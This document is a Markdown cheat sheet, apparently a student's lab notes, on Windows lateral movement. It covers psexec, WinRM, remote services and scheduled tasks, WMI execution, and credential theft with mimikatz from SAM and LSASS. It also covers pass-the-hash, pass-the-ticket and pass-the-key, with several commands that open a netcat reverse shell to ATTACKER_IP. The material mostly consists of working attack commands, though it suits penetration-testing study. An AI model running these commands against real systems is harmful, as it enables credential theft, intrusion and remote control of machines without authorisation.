# About UAC & Admins:
- The differences we are interested in are restrictions imposed by User Account Control (UAC) over local administrators (except for the default Administrator account). By default, **local administrators won't be able to remotely connect to a machine** and perform administrative tasks unless using an interactive session through **RDP**. Windows will deny any administrative task requested via RPC, SMB or WinRM since such administrators will be logged in with a filtered medium integrity token, preventing the account from doing privileged actions. The only local account that will get full privileges is the default Administrator account.
- **Domain accounts with local administration privileges** won't be subject to the same treatment and will be logged in with **full administrative privileges**.



### Runas is usefull:
    + runas.exe /netonly /user:<domain>\<username> cmd.exe

# 1-Psexec:
- **Required_1**: Ports: 445/TCP (SMB)
- **Required_2**: Group Memberships: Administrators
- **command**
```ps1
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

# 2-WinRM(create process):
- **Required_1**: Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required_2**: Group Memberships: Remote Management Users
- **command option1**
```ps1
#To connect to a remote Powershell session from the command line, we can use the following command
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
- **command option2**
```ps1
#We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
#Options1_ Interactive session:
Enter-PSSession -Computername TARGET -Credential $credential
#Options2_ run Script:
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```


# 3-SC.exe
**create services remotely**
- **Required_1**: Ports:
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required_2**: Group Memberships: Administrators
- **command**
```ps1
# create Service
sc.exe \\TARGET create ServiceName binPath= "<command/payload to execute>" start= auto 
sc.exe \\TARGET start ServiceName
# kill Service
sc.exe \\TARGET stop ServiceName
sc.exe \\TARGET delete ServiceName
``` 

# 4-creating Scheduled Task remotely:
```ps1
schtasks /s TARGET /RU "SYSTEM" /create /tn "TaskName" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "TaskName" 

# Kill Schedule task:
schtasks /S TARGET /TN "TaskName" /DELETE /F
```

# 5-Fuckin WMI:
- **Required**:
    - **DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
    - **Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
- First we need to provide objects for connecting to WMI:
```ps1
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
## 5.1-Remote Process creation Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
$Command = "powershell.exe -Command <command to execute>";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
# you can also do this
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c <command to execute>" 
```
## 5.2-Creating Services Remotely Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "ServiceName";
DisplayName = "ServiceName";
PathName = "<command/path to executable>";
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# to Kill the service:
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## 5.3-Creating Scheduled Tasks Remotely Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c <command>"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "TaskName"
Start-ScheduledTask -CimSession $Session -TaskName "TaskName"

# to kill The Task:
Unregister-ScheduledTask -CimSession $Session -TaskName "TaskName"
```

## 5.4-Installing MSI packages Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
# on legacy systems:
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

# 6-Alternative for plain-text passwords:
## 6.1 NTLM-hash:
- **Note**: 
    - the NTLM challenge sent during authentication can be responded to just by knowing the password hash.
    - This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, 
    - if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.
- **Extracting NTLM hashes from local SAM(only local users)**:
```ps1
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam   
```
- **Extracting NTLM hashes from LSASS memory(local and domain users):**
```ps1
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv 
```
- **Pass-The-Hash**:
```ps1
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:<UserName> /domain:<DomainName> /ntlm:<NTLM-hash> /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
# if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.
```
- **Pass-The-Hash using Linux Tools**:
```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
````
## 6.2 Kerberos:
- **mechanisim**: 
    - 1-user sends his username and a **timestamp encrypted using a key derived from his password** to KDC
    - 2-The KDC will create and send back a TGT,  Along with the TGT, a **Session Key** is given to the use
    - 3-To request a TGS, the user will send his username and a timestamp **encrypted using the Session Key**, along with the TGT and a **SPN**
    - 4-As a result, the KDC will send us a TGS and a **Service Session Key**, and TGS is encrypted using the **Service Owner Hash**
   ### 6.2.1 Pass-The-Ticket
    - **Notes**:
        - Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz
        - Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary.
        - Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).
    - **command to Extract the keys:**
    ```ps1
    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export
    ```
    - **inject tickets:**
    ```
    #Injecting tickets in our own session doesn't require administrator privileges
    mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-<domainName>.kirbi
    ```
   ### 6.2.2 Pass-The-Key
    - **Notes**:
        - When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. 
        - If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
    - **extract Kerberos encryption keys**
    ```
    mimikatz # privilege::debug
    mimikatz # sekurlsa::ekeys
    ```
    - **use this keys to get revShell**:
    ```    
        #If we have the RC4 hash:
        mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
        #If we have the AES128 hash:
        mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
        #If we have the AES256 hash:
        mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
    ```
        - Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).
